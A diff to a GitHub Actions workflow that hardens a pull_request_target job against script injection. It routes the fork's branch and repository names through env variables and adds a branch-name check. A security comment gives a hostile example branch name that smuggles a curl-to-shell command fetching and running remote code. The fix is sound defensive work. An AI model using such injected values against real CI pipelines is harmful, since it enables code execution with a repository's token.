@@ -31,36 +31,59 @@ jobs:
 
       - name: Check if PR is from a fork
         id: fork-check
+        env:
+          HEAD_IS_FORK: ${{ github.event.pull_request.head.repo.fork }}
+          HEAD_REPO: ${{ github.event.pull_request.head.repo.full_name }}
+          HEAD_OWNER: ${{ github.event.pull_request.head.repo.owner.login }}
         run: |
-          if [ "${{ github.event.pull_request.head.repo.fork }}" = "true" ]; then
-            echo "is_fork=true" >> $GITHUB_OUTPUT
-            echo "fork_repo=${{ github.event.pull_request.head.repo.full_name }}" >> $GITHUB_OUTPUT
-            echo "fork_owner=${{ github.event.pull_request.head.repo.owner.login }}" >> $GITHUB_OUTPUT
+          if [ "$HEAD_IS_FORK" = "true" ]; then
+            {
+              echo "is_fork=true"
+              echo "fork_repo=$HEAD_REPO"
+              echo "fork_owner=$HEAD_OWNER"
+            } >> "$GITHUB_OUTPUT"
           else
-            echo "is_fork=false" >> $GITHUB_OUTPUT
+            echo "is_fork=false" >> "$GITHUB_OUTPUT"
           fi
 
       - name: Extract PR branch for safe checkout
         if: steps.fork-check.outputs.is_fork == 'true'
         id: pr-checkout
+        env:
+          PR_BRANCH: ${{ github.event.pull_request.head.ref }}
+          FORK_REPO: ${{ github.event.pull_request.head.repo.full_name }}
         run: |
-          # We need to safely checkout the PR branch from the fork
-          # This is safe because we're in the base repo context
-          PR_BRANCH="${{ github.event.pull_request.head.ref }}"
-          FORK_REPO="${{ github.event.pull_request.head.repo.full_name }}"
-          
+          # Check out the PR branch from the fork.
+          #
+          # SECURITY — read before editing. This job runs on
+          # `pull_request_target`, which means it executes in the BASE
+          # repository context holding BASE repository permissions. That is
+          # exactly why a fork's branch name must NEVER be interpolated into
+          # this script: `${{ }}` is expanded into the script TEXT by the
+          # runner before bash ever parses it, so a fork branch named
+          # `x";curl evil|sh;"` would run here with this job's token. Being in
+          # the base context is what makes it dangerous, not what makes it
+          # safe. Both values therefore arrive through `env:` above and are
+          # only ever referenced as quoted shell variables.
+          case "$PR_BRANCH" in
+            ""|-*|*..*)
+              echo "::error::refusing to check out an unsafe branch name"
+              exit 1
+              ;;
+          esac
+
           echo "Checking out PR branch from fork: $FORK_REPO/$PR_BRANCH"
-          
+
           # Add the fork as a remote temporarily
           git remote add pr-fork "https://github.com/$FORK_REPO.git" 2>/dev/null || true
-          
+
           # Fetch the PR branch
-          git fetch pr-fork "$PR_BRANCH" 2>/dev/null || true
-          
+          git fetch pr-fork -- "$PR_BRANCH" 2>/dev/null || true
+
           # Checkout the PR branch
           git checkout -f "pr-fork/$PR_BRANCH" 2>/dev/null || git checkout -f "$PR_BRANCH" 2>/dev/null || true
-          
-          echo "pr_checked_out=true" >> $GITHUB_OUTPUT
+
+          echo "pr_checked_out=true" >> "$GITHUB_OUTPUT"
 
       - name: Security Scan - Secrets Detection
         if: steps.fork-check.outputs.is_fork == 'true' && steps.pr-checkout.outputs.pr_checked_out == 'true'
